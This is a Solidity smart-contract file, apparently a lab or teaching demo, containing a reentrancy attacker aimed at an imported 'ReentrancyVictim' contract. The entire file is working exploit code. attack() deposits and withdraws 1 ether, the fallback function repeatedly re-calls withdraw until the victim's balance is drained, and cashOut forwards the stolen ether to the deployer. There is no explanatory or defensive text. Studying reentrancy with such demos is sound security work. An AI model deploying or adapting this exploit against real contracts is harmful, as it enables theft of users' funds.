//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.8;

import "./ReentrancyVictim.sol";

contract ReentrancyAttacker {
    ReentrancyVictim public victim;
    address payable _owner;
    
    constructor(address payable _addr) public {
        victim = ReentrancyVictim(_addr);
        _owner = payable(msg.sender);
    }
    
    fallback() external payable {
        if(address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "You need to send one ether when attacking");
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    } 
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
 
    function cashOut(address payable _addr) external payable {
        require(msg.sender == _owner);
        _addr.transfer(address(this).balance);
    }
}
